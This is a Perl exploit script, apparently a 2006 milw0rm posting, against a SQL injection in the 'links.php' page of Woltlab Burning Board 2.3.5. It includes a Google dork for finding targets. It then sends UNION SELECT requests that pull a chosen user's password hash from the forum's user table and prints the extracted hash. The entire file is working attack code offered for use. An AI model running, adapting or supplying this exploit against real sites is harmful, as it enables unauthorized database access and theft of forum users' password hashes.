#!/usr/bin/perl

use IO::Socket;

print q{
################################################################################
##                                                                            ##
##  Woltlab Burning Board 2.3.5 &lt;= &quot;links.php&quot; SQL Injection Exploit          ##
##  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -       ##
##  Exploit by       |  hias                                                  ##
##  Googledork       |  inurl:/wbb2/links.php?cat                             ##
##  Usage            |  links.pl [server] [path] [userid]                     ##
##  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -       ##
##                                                                            ##
################################################################################

};

$webpage = $ARGV[0];
$directory = $ARGV[1];
$userid = $ARGV[2];

if (!$webpage||!$directory) { die &quot;[+] Exploit failed\n&quot;; }

$wbb_dir = 
&quot;http://&quot;.$webpage.$directory.&quot;links.php?cat=5474902010+union+select+password,username+from+bb1_users+where+userid=$userid&quot;;

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$webpage&quot;, 
PeerPort=&gt;&quot;80&quot;) || die &quot;[+] Can&#039;t connect to Server\n&quot;;
print &quot;[+] Exploiting.....\n&quot;;
print $sock &quot;GET $wbb_dir HTTP/1.1\n&quot;;
print $sock &quot;Accept: */*\n&quot;;
print $sock &quot;User-Agent: Hacker\n&quot;;
print $sock &quot;Host: $webpage\n&quot;;
print $sock &quot;Connection: close\n\n&quot;;

while ($answer = &lt;$sock&gt;) {
if ($answer =~ 
/(................................)&lt;\/span&gt;&lt;\/b&gt;&lt;\/font&gt;/) {
print &quot;[+] Hash: $1\n&quot;;
exit();
}
if ($answer =~ /SQL-DATABASE ERROR/) {
break;
}
}

$wbb_dir = 
&quot;http://&quot;.$webpage.$directory.&quot;links.php?cat=5474902010+union+select+password,userid+from+bb1_users+where+userid=$userid&quot;;
close($sock);

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$webpage&quot;, 
PeerPort=&gt;&quot;80&quot;) || die &quot;[+] Can&#039;t connect to Server\n&quot;;
print $sock &quot;GET $wbb_dir HTTP/1.1\n&quot;;
print $sock &quot;Accept: */*\n&quot;;
print $sock &quot;User-Agent: Hacker\n&quot;;
print $sock &quot;Host: $webpage\n&quot;;
print $sock &quot;Connection: close\n\n&quot;;

while ($answer = &lt;$sock&gt;) {
if ($answer =~ 
/(................................)&lt;\/span&gt;&lt;\/b&gt;&lt;\/font&gt;/) {
print &quot;[+] Hash: $1\n&quot;;
exit();
}
if ($answer =~ /SQL-DATABASE ERROR/) {
print &quot;[+] Database doesn&#039;t exist. try replacing bb1_users with bb2_users or bb3_users\n&quot;;
break;
}
}
close($sock);

print &quot;[+] Exploit failed\n&quot;;

# milw0rm.com [2006-08-17]
